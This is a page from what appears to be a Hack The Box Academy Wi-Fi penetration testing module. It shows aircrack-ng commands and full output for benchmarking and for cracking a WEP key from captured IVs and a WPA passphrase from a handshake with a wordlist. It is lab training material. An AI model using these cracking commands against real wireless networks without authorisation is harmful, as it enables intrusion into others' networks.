<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/222/section/2926
// Platform Version: V1
// Module ID: 222
// Module Name: Wi-Fi Penetration Testing Basics
// Module Difficulty: Medium
// Section ID: 2926
// Section Title: Aircrack-ng
// Page Title: Hack The Box - Academy
// Page Number: 12
-->

# Aircrack-ng

**Module Name:** Wi-Fi Penetration Testing Basics **Page Number:** 12

#### 

#### WI-FI PENETRATION TESTING BASICS

# Aircrack-ng

### Aircrack-ng Benchmark

``` shell-session
[!bash!]$ aircrack-ng -S

1628.101 k/s
```

### Cracking WEP

``` shell-session
[!bash!]$ aircrack-ng -K HTB.ivs 

Reading packets, please wait...
Opening HTB.ivs
Read 567298 packets.

   #  BSSID              ESSID                     Encryption

   1  D2:13:94:21:7F:1A                            WEP (0 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening HTB.ivs
Read 567298 packets.

1 potential targets

                                             Aircrack-ng 1.6 


                               [00:00:17] Tested 1741 keys (got 566693 IVs)

   KB    depth   byte(vote)
    0    0/  1   EB(  50) 11(  20) 71(  20) 0D(  12) 10(  12) 68(  12) 84(  12) 0A(   9) 
    1    1/  2   C8(  31) BD(  18) F8(  17) E6(  16) 35(  15) 7A(  13) 7F(  13) 81(  13) 
    2    0/  3   7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 86(  12) 1B(  10) BF(  10) 
    3    0/  1   3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) D7(  12) ED(  12) F0(  12) 
    4    0/  1   03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) AD(  12) 86(  10) DB(  10) 
    5    0/  1   D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) A1(  20) A0(  18) 4F(  17) 
    6    0/  1   AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 54(  12) 3C(  11) 90(  11) 
    7    0/  1   DA( 168) 90(  24) 72(  22) F5(  21) 11(  20) F1(  20) 86(  17) FB(  16) 
    8    0/  1   F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) EA(  18) 82(  17) 11(  16) 
    9    1/  2   7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 66(  19) E9(  18) 64(  17) 
   10    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0) 

             KEY FOUND! [ EB:C8:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ] 
	Decrypted correctly: 100%
```

### Cracking WPA

``` shell-session
[!bash!]$ aircrack-ng HTB.pcap -w /opt/wordlist.txt

Reading packets, please wait...
Opening HTB.pcap
Read 1093 packets.

   #  BSSID              ESSID                     Encryption

   1  2D:0C:51:12:B2:33  HTB-Wireless              WPA (1 handshake, with PMKID)
   2  DA:28:A7:B7:30:84                            Unknown
   3  53:68:F7:B7:51:B9                            Unknown
   4  95:D1:46:23:5A:DD                            Unknown



Index number of target network ? 1

Reading packets, please wait...
Opening HTB.pcap
Read 1093 packets.

1 potential targets

                               Aircrack-ng 1.6 

      [00:00:00] 802/14344392 keys tested (2345.32 k/s) 

      Time left: 1 hour, 41 minutes, 55 seconds                  0.01%

                           KEY FOUND! [ HTB@123 ]


      Master Key     : A2 88 FC F0 CA AA CD A9 A9 F5 86 33 FF 35 E8 99 
                       2A 01 D9 C1 0B A5 E0 2E FD F8 CB 5D 73 0C E7 BC 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : A4 62 A7 02 9A D5 BA 30 B6 AF 0D F3 91 98 8E 45
```

## Moving On

# 

# 

#### Questions

####